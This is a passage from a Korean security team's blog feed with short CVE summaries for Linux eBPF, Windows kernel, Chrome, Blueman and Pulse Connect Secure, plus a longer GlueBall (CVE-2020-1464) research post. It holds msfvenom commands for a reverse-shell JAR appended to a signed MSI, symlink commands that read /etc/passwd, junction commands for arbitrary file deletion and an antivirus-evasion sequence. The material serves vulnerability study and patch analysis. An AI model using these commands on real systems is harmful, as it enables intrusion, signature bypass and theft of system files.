);&#125;</code></pre><p>해당 취약점에 관한 PoC Code는 <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">여기</a>서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>dos</tag>
      
      <tag>apache</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>websocket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27194: eBPF verifier bug</title>
    <link href="/2020/11/04/fabu1ous/2020-11-04/"/>
    <url>/2020/11/04/fabu1ous/2020-11-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 트래킹해  memory load와 store의 out-of-bound 여부를 검사하며,  32-bit와 64-bit 각각의 range를 구분해 관리합니다. OR연산이 끝난 후 그에 맞게  32-bit 레지스터의 range를 업데이트하는 <code>scalar32_min_max_or()</code>함수는 이 구분이 확실하지 못하고, 버그를 유발합니다.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit range를 32-bit range로 casting 하는 <code>scalar32_min_max_or()</code>의 코드 부분입니다. Verifier는 <code>s32_min_value</code>와 <code>s32_max_value</code>를 이용해 range를 트래킹 하는데, 만약 이 두 값이 같다면 레지스터 값을 상수로 인식하고 그에 따라 코드가 분기합니다. </p><p>만약 위 코드에서 <code>dst_reg-&gt;umin_value</code>가 1이고, <code>dst_reg-&gt;umax_value</code>가 25769803777이라면 <code>dst_reg-&gt;s32_min_value</code>와 <code>dst_reg-&gt;s32_max_value</code> 둘 다 1로 저장되어 레지스터를 range가 아닌 상수로 인식하게 됩니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ebpf</tag>
      
      <tag>bpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games</title>
    <link href="/2020/11/03/l0ch/11-03_1day1line/"/>
    <url>/2020/11/03/l0ch/11-03_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Store에서 배포하는 UWP(Universal Windows platform) 앱은 일반적으로  <code>C:\Program Files\WindowsApps</code> 디렉터리에 저장되어 일반적인 권한으로 접근할 수 없으며 Appx라는 형식의 파일을 앱 설치 관리자 프로그램을 통해서만 설치/제거가 가능합니다. </p><p>지난 6월 Microsoft는 게임 앱의 모드를 지원하기 위해 수정이 가능한 Windows 앱을 호스팅 하는 디렉터리인 <code>C:\ProgramFiles\ModifiableWindowsApps</code>을 추가했는데, 이 기능에 심볼릭 링크를 사용해 arbitrary file deletion 취약점이 발견되었습니다.</p><p>PoC는 아래와 같습니다.</p><ol><li>다른 시스템 드라이브 <code>D:\</code>에 pivot 할 경로를 생성하고 windows 저장소 설정을 통해 기본 저장 위치를 <code>D:\</code> 로 변경합니다</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol start="2"><li><p>Microsoft Store에서 모드 지원이 되는 게임 앱을 받아 설치하면 <code>D:\Program Files\ModifiableWindowsApps</code> 하위에 해당 앱의 디렉터리가 생성됩니다.</p></li><li><p>이중 심볼릭 링크를 생성해 앱의 디렉터리가 심볼릭 링크의 교차점이 되도록 만들고, 심볼릭 링크로 리디렉션 할 최종 디렉터리는 삭제할 시스템 권한의 디렉터리로 설정합니다.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol start="4"><li>앱을 삭제하면 이중 심볼릭 링크로 인해 시스템 권한으로 임의 경로의 파일이 삭제됩니다.</li></ol><p>작성자는 시스템 권한의 쉘을 실행하는 데모 영상 또한 공개했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file deletion</tag>
      
      <tag>microsoft store</tag>
      
      <tag>symbolic link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17087: Windows kernel cng.sys pool-based buffer overflow</title>
    <link href="/2020/11/02/idioth/2020-11-02/"/>
    <url>/2020/11/02/idioth/2020-11-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2104">Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 1903(64-bit)</li><li>Maybe since at least Windows 7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>윈도우 커널 암호화 드라이버인 cng.sys에서 권한 상승이 가능한 취약점이 발견되었습니다. 해당 취약점은 IOCTL 0x390400 처리 중 <code>cng!CfgAdtpFormatPropertyBlock</code> 함수에서 16-bit integer truncation에 의해 발생했습니다.</p><pre><code class="hljs c">CONST USHORT DestinationSize = (USHORT)(<span class="hljs-number">6</span> * SourceLength);PWCHAR OutputBuffer = BCryptAlloc(DestinationSize);<span class="hljs-keyword">for</span> (USHORT i = <span class="hljs-number">0</span>; i &lt; SourceLength; i++) &#123;*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &gt;&gt; <span class="hljs-number">4</span>];*OutputBuffer++ = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>[*SourceBuffer &amp; <span class="hljs-number">0xF</span>];*OutputBuffer++ = <span class="hljs-string">&#x27; &#x27;</span>;SourceBuffer++;&#125;</code></pre><p><code>SourceLength</code>의 값이 <code>0x2AAB</code>보다 크거나 같으면 NonPagedPool에 비정상적으로 작은 버퍼가 할당되고 binary-to-hex 변환 루프에 의해 오버 플로우가 발생합니다. 윈도우 10 1903에서 테스트되었지만 윈도우 7부터 취약점이 존재하는 것으로 예상되며 현재 취약점이 악용되고 있다고 합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>ioctl</tag>
      
      <tag>cng.sys</tag>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] CVE-2020-1464: GlueBall</title>
    <link href="/2020/11/01/l0ch/cve-2020-1464/"/>
    <url>/2020/11/01/l0ch/cve-2020-1464/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! 글 쓰는 걸 미루고 미루다 idioth 팀장님의 구박에 겨우겨우 첫 글을 쓰는 L0ch입니다. </p><p><del>악덕 상사 우우 길 가다 레고 블록이나 밟아라</del> </p><p>오늘은 Windows의 취약점 하나를 들고 왔는데요, 함께 보실까요? </p><h1 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h1><p>GlueBall이라고 불리는 CVE-2020-1464는 2018년 9월에 제보되었습니다. 근데 마소 친구들이 패치 안 하고 있다가 2년이 지난 최근 patch tuesday라고 불리는 정기 패치에서 패치가 되었…? 왜 지금 와서???</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img1.png"></p><p>이상하긴 하지만… 넘어가도록 하고 취약점을 이해하는데 필요한 배경 지식부터 알아보도록 합시다!</p><h1 id="MSI-Microsoft-Installer"><a href="#MSI-Microsoft-Installer" class="headerlink" title="MSI (Microsoft Installer)"></a>MSI (Microsoft Installer)</h1><p>Windows 설치 패키지<br>→ Windows용 애플리케이션의 설치 및 업데이트를 배포하는 데 사용됩니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img2.png"></p><p>오늘의 희생양(ㅎㅎ)이 될 우리 크롬 어서 오고.<br>크롬도 MSI로 배포되는 것을 알 수 있습니다. malicious 하게 꾸며줄 테니 조금만 기다리라구~</p><h1 id="Code-Signing-Certificate-코드-서명-인증서"><a href="#Code-Signing-Certificate-코드-서명-인증서" class="headerlink" title="Code Signing Certificate(코드 서명 인증서)"></a>Code Signing Certificate(코드 서명 인증서)</h1><blockquote><p><strong>Code Signing Certificate</strong><br>MS가 도입한 실행파일과 스크립트의 디지털 서명 과정으로, 이러한 인증서는 파일이 안전한 파일임을 증명해준다. SmartScreen filter는 인증서에 대한 자체적인 white list DB를 관리해 해당 인증서가 안전한지 아닌지<br>판단한다. 인증서가 존재하지 않거나 파일이 변조되어 인증서가 유효하지 않으면 실행할 때 경고를 띄워<br>사용자에게 알린다.</p></blockquote><p><img src="/2020/11/01/l0ch/cve-2020-1464/img3.png"></p><p>코드 서명 인증서가 도입되면서, 인증서가 확인되지 않은 파일의 무분별한 실행이 줄었습니다. 그러나 여기서 끝나면 섭섭하죠? 유효하지 않은 인증서임에도 인증서 검증을 우회할 수 있는 취약점이 발견되었는데 이것이 오늘 설명할 GlueBall입니다.</p><h1 id="GlueBall-CVE-2020-1464"><a href="#GlueBall-CVE-2020-1464" class="headerlink" title="GlueBall : CVE-2020-1464"></a>GlueBall : CVE-2020-1464</h1><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>취약점은 MSI 파일의 인증서 검증 과정에서 발생합니다. </p><p>MSI 파일을 실행하면 <code>msisip.dll</code>의 <code>MsiSIPVerifyIndirectData()</code> 함수에서 파일의 시작 부분이 유효한 MSI 파일인지 검증하고 서명을 확인합니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img4.png"></p><p>그런데 이때 파일의 사이즈를 검증하지 않아 MSI 파일의 뒤에 임의의 데이터가 추가되어도 유효한 인증서라고 판단하게 되고, 공격자는 이를 이용해 인증서 검증을 우회하고 malicious 파일을 실행하도록 할 수 있습니다.</p><h2 id="JAR-Java-Archive"><a href="#JAR-Java-Archive" class="headerlink" title="JAR(Java Archive)"></a>JAR(Java Archive)</h2><p><img src="/2020/11/01/l0ch/cve-2020-1464/img5.webp"></p><p>JAR은 자바 플랫폼 배포를 위한 패키지 파일 포맷입니다.<br>특징으로는 zip 포맷으로 빌드되어 자바 런타임에서 로드될 때 파일의 끝에서부터 로드됩니다.</p><p>→ 파일 앞에 임의의 데이터가 있어도 정상 실행이 가능합니다.</p><p>슬슬 감이 올락 말락 하죠??</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>앞서 나온 취약점과 JAR 파일의 특성을 조합하면..?</p><p><strong>MSI 파일 끝에 임의 데이터가 와도 유효한 인증서가 되는 취약점 + 파일 앞에 임의의 데이터가 있어도 정상 실행되는 jar</strong></p><p>축하합니다! 익스플로잇 시나리오가 완성되었습니다!</p><p>그림으로 정리하면 다음과 같습니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img6.png" alt="출처:https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/"></p><p>만능 메타스플로잇으로 리버스 쉘 malicious 파일을 생성해서 익스를 해볼게요.</p><p>msfvenom으로 리버스 쉘을 여는 jar포맷의  malicious 파일을 생성합니다.</p><pre><code class="hljs markdown">msfvenom -p java/meterpreter/revserse<span class="hljs-emphasis">_https LHOST=[HOST IP] -f jar -o [filename].jar</span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img7.png"></p><p>리스너도 미리 열어두겠습니다.</p><pre><code class="hljs markdown">handler -p java/meterpreter/reverse<span class="hljs-emphasis">_https -H 0.0.0.0 </span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img8.png"></p><p>생성된 jar 파일과 크롬 설치 msi 파일을 합칩니다. 이때 꼭 msi파일 뒤에 jar 파일이 오도록 순서를 지켜야 한다는 점!</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img9.png"></p><p>이제 생성된 exploit.jar 에서 인증서가 유효한지 확인해보면</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img10.png"></p><p>요렇게 유효한 인증서로 나오는 것을 볼 수 있습니다. </p><p>실행을 해보면 피해 PC에서는 아무 반응도 없지만, 프로세스에서는 자바가 돌아가고 있고</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img11.png"></p><p>위 사진과 같이 리버스 쉘이 정상적으로 동작하는 걸 볼 수 있습니다!</p><h2 id="Patch-diffing"><a href="#Patch-diffing" class="headerlink" title="Patch diffing"></a>Patch diffing</h2><p>MS는 이에 대한 패치를 내놨는데요, 어떻게 패치를 했는지 패치 이후의 msisip.dll를 구해 비교해보겠습니다.</p><blockquote><p>💡주의! 글쓴이의 삽질이 담겨 있습니다.</p></blockquote><p>않이 근데.. 이거 익스하고 글 좀 쓰고 디핑 하려고 보니까 그새 윈도우가 업데이트를 해버렸네..?</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img12.jpg"></p><p>아 ** </p><ul><li>자동 업데이트 안 끔</li><li>스냅샷 안 만들어놓음</li></ul><p>→ 패치 전의 msisip.dll 못 구함 → ?????????</p><p>윈도우 원데이 분석할 땐 자동 업데이트는 꼭 끄도록 해요……. 아니면 스냅샷이라도…</p><p>패치 전의 msisip.dll을 어떻게 구하지? 어떻게 구하긴 조진 거지 ㅋㅋ</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img13.png"></p><p>엿같은 자동 업데이트 덕분에 던질 뻔했지만..^^<br>결국 idioth형 vm에 패치 전 파일이 있어서 그거 구걸해서 디핑 해버렸지요. 팀장님 최고 ~<br>넘겨주는 대신 리제로 정주행 하라는 협박은 못 들은 걸로 하겠습니다; </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img14.png"></p><p>회색 노드는 새로 추가된 코드, 노란색 노드는 변경된 노드입니다.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img15.png"></p><p>회색 노드를 보면 <code>MsiSIPVerifyIndirectData()</code> 함수에서 <code>NeedFileSizeVerification()</code> 과 <code>VerifyFileSize()</code> 를 호출하는 코드가 추가된 것을 보아 MSI 파일의 사이즈를 확인하는 코드를 추가해 취약점 패치를 한 것을 알 수 있습니다.</p><p>취약점 분석이랑 익스 하는 것보다 디핑 하는데 시간을 훨씬 많이 썼네요…^^ 이  과정을 개선할 여지가 있을 것 같아 다음 글은 디핑과 관련된 연구 주제 일 것 같습니다.  이거 하느라 윈도우 vm만 5개 만든 건 안 비밀 ^.^ </p><p>그럼 다음 글로 돌아올게요 안녕!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>msi</tag>
      
      <tag>L0ch</tag>
      
      <tag>code signing certificate</tag>
      
      <tag>jar</tag>
      
      <tag>glueball</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15238: Blueman argument injection</title>
    <link href="/2020/10/31/fabu1ous/2020-10-31/"/>
    <url>/2020/10/31/fabu1ous/2020-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.exploit-db.com/exploits/48963">Blueman &lt; 2.1.4 - Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Blueman 2.1.4 이전 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-bus(Desktop-bus)는 IPC 혹은 RPC 메커니즘입니다. D-bus의 DHCPClient 메소드와 Blueman 사이에 arguments sanitizing 과정이 없어 argument injection이 발생하고, 시스템 구성에 따라 impact가 2가지로 나뉩니다. </p><pre><code class="hljs routeros">1. isc-dhcp-client 사용 시<span class="hljs-built_in">ip </span>명령어에 argument injection, 인터페이스를 종료하는 Dos2. dhcpd package 사용 시<span class="hljs-string">&quot;-c/arbitrary_script_path&quot;</span>옵션을 사용해 임의의 스크립트를 실행</code></pre><p>대부분의  D-bus 인터페이스는 PolicyKit으로 Authentication을 거치지만 Blueman 2.0.6 이전 버전은 Polkit-1이 기본적으로 비활성화되어있어, 모든 로컬 유저가 취약점을 트리거할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html">https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>blueman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6449: Exploiting a textbook use-after-free in Chrome</title>
    <link href="/2020/10/30/l0ch/10-30_1day1line/"/>
    <url>/2020/10/30/l0ch/10-30_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf">Exploiting a textbook use-after-free in Chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome version: master branch build 79956ba, asan build 80.3987.132 Operating System: Ubuntu 18.04</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-6449는 Chrome에서 사용하는 blink 엔진의 <code>WebAudio</code> 모듈에서 발생하는 Use-After-Free 취약점 입니다. </p><p>취약점은 <code>DeferredTaskHandler::BreakConnections</code> 에서 발생합니다. 일반적으로 <code>active_source_handlers_</code>는 <code>finished_source_handlers_</code> 의 원시 포인터를 활성 상태로 유지하는 역할을 하며 사용이 완료된 이후에는 할당된 <code>active_source_handlers_</code> 와 <code>finished_source_handlers_</code> 가 같이 free되어야 합니다.</p><p>그러나 컨텍스트를 삭제하여 <code>BaseAudioContext::Uninitialize</code> 가 실행된 이후 <code>DeferredTaskHandler::ClearHandlersToBeDeleted</code> 를 호출하면 <code>active_source_handlers_</code> 만 free되고 <code>finished_source_handlers_</code> 에 free된 포인터가 남게 됩니다. 이후 <code>DeferredTaskHandler::BreakConnections</code> 를 호출해 UAF 취약점을 트리거할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc">https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-040-chrome">https://securitylab.github.com/advisories/GHSL-2020-040-chrome</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>use after free</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>chromium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16939: Windows Group Policy DACL overwrite를 이용한 권한 상승</title>
    <link href="/2020/10/29/idioth/2020-10-29/"/>
    <url>/2020/10/29/idioth/2020-10-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation">CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 그룹 정책 업데이트 실행 중에 수행되는  <code>SetSecurityFile</code>을 악용하는 취약점입니다.</p><p><code>gpupdate /target:user /force</code> 실행 시 <code>SetSecurityFile</code>는 impersonation 없이 수행됩니다. 그룹 정책 업데이트가 실행된 후 <code>%programdata%\Microsoft\GroupPolicy\Users\&lt;SID&gt;</code>의 소유자는 Administrators가 되고 User 그룹은 읽기 및 실행 권한만 갖게 됩니다. 하지만 하위 디렉터리인 <code>\Datastore\0\sysvol</code>의 소유자는 User가 됩니다. 따라서 권한이 낮더라도 해당 폴더의 권한을 수정할 수 있습니다.</p><p><code>sysvol</code> 디렉터리 아래에 권한을 수정할 디렉터리의 Junction을 생성한 후 그룹 정책 업데이트를 실행합니다. 해당 폴더와 폴더 내의 파일들은 모두 DACL Write의 대상이 되며  DACL Write 중 에러가 발생하면 수정한 권한이 부여됩니다. 에러가 발생하게 하는 방법 중 하나는 DACL Write가 완료되기 전에 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">oplock</a>을 사용하여 juction을 삭제하는 것입니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>dacl</tag>
      
      <tag>group policy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Process Herpaderping</title>
    <link href="/2020/10/28/fabu1ous/2020-10-28/"/>
    <url>/2020/10/28/fabu1ous/2020-10-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jxy-s.github.io/herpaderping/">Process Herpaderping</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>OS</strong></p><ul><li>Windows 7 Enterprise x86</li><li>windows 10 Pro x64</li><li>Windows 10 Pro Insider Preview x64</li></ul><p><strong>Security Prodct</strong></p><ul><li>Windows Defender AntiMalware Client</li><li>Windows Defender Engine</li><li>Windows Defender Antivirus</li><li>Windows Defender Antispyware</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><code>Herpaderping</code>이라는 Detection Evasion 기술입니다. 디스크에 존재하는 실행파일을 Process object의 생성과 Initial Thread 삽입 과정 사이에서 수정하는 탐지 우회 방법이 존재합니다. 이를 방지하고자 파일에 write 작업이 있었는지 확인하는 <code>on-write scanning</code>이 도입됐습니다. 문제는 이 <code>on-write scanning</code>이 <code>IRP_MJ_CLEANUP</code>(== file handle close)이 발생하기 전까지 파일의 수정 여부를 검사하지 않는다는 겁니다. 따라서 아래와 같은 순서로 우회가 가능합니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> CreateFile (File handle을 계속 열어놓는다.)<span class="hljs-number">2.</span> NtCreateSectioin<span class="hljs-number">3.</span> NtCreatePrcessex<span class="hljs-number">4.</span> 실행파일 수정<span class="hljs-number">5.</span> NtCreateThreadEx<span class="hljs-number">6.</span> CloseFile (IRP_MJ_ClEANUP)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>detection evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message</title>
    <link href="/2020/10/27/l0ch/10-27_1day1line/"/>
    <url>/2020/10/27/l0ch/10-27_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/">Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message (CVE-2020-8255)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Pulse Connect Secure</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSL VPN 서비스인 Pulse Connect Secure에서 로그온 메시지 구성 요소를 악용해 arbitrary file read가 가능한 취약점이 발견되었습니다.</p><p>관리자는 로그인 시 출력되는 메시지를 <code>/dana-admin/auth/signinNotf.cgi</code> 페이지를 통해 설정할 수 있는데, <code>en.txt</code> 및 <code>default.txt</code> 파일로 구성된 zip 형식의 파일을 업로드하면 해당 파일의 내용이 로그온 메시지로 표시됩니다.</p><p>이때 zip 파일에 포함된 파일의 심볼릭 링크 여부를 확인하지 않으며 read 할 파일을 심볼릭 링크로 설정하는 arbitrary file read가 가능합니다.</p><p>다음은 <code>/etc/passwd</code> 파일을 출력하는 POC입니다.</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-keyword">default</span>.txtln -s <span class="hljs-regexp">/etc/</span>passwd en.txtzip --symlinks logon.zip <span class="hljs-keyword">default</span>.txt en.txtadding: <span class="hljs-keyword">default</span>.txt (stored <span class="hljs-number">0</span>%)adding: en.txt (stored <span class="hljs-number">0</span>%)</code></pre><p>위와 같이 파일에 심볼릭 링크를 설정해 zip으로 압축한 뒤 <code>/dana-admin/auth/signinNotf.cgi</code> 페이지에 업로드하면 로그온 페이지에 <code>/etc/passwd</code>의 내용이 표시됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1034: Windows Kernel EoP</title>
    <link href="/2020/10/26/idioth/cve-2020-1034/"/>
    <url>/2020/10/26/idioth/cve-2020-1034/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=2">Explicit Is Always Good? Read the Story of CVE-2020-1034</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 8</li><li>Windows 10</li><li>Windows Server 2012</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 9월 커널 권한 상승 취약점에 대한 패치가 포함되었습니다. 해당 패치에 영향을 받는 모듈은 <code>ntoskrnl.exe</code>입니다.</p><p><code>EtwpNotifyGuid</code>에서 <code>cmp [rdi+0Ch], r12b</code>를 수행하는데 <code>r12b</code>의 초기화 값은 4이지만 1로 리셋이 됩니다. <code>byte ptr[rdi+0Ch]</code>가 1의 값과 같다면 <code>rdi+18h</code> 값은 새로 생성된 <code>UmReplyObject</code>의 주소로 설정됩니다. <code>twpQueueNotification</code>에서 <code>UmReplyObject</code>가 참조된 부분을 찾으면 <code>bl</code>의 값은 0이고 <code>rbp+0Ch</code>가 0이 아닐 시 <code>rbp+18h</code>는 객체의 포인터를 읽습니다. </p><p><code>rbp+0Ch</code>는  <code>EtwpNotifyGuid</code>에서는 1과 비교하여 <code>UmReplyObject</code>를 만들지 여부를 결정하지만 마지막 비교에서 0과 비교하여 일관성 없는 비교가 됩니다.</p><p>만약 비교한 값이 1이나 0이 아닐 경우 객체 주소가 임의의 값으로 사용되고 <code>ObfReferenceObject</code>가 호출되어 <code>ptr[[InputBuffer + 0x18]-0x30] ++</code>연산이 수행되어 임의 주소 증가가 이루어집니다. 따라서 Windows 10 RS4 이상의 커널에서 프로세스 토큰의 권한 필드를 조작할 수 있습니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>idioth</tag>
      
      <tag>ntoskrnl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] AngryGhidra를 사용해보자!</title>
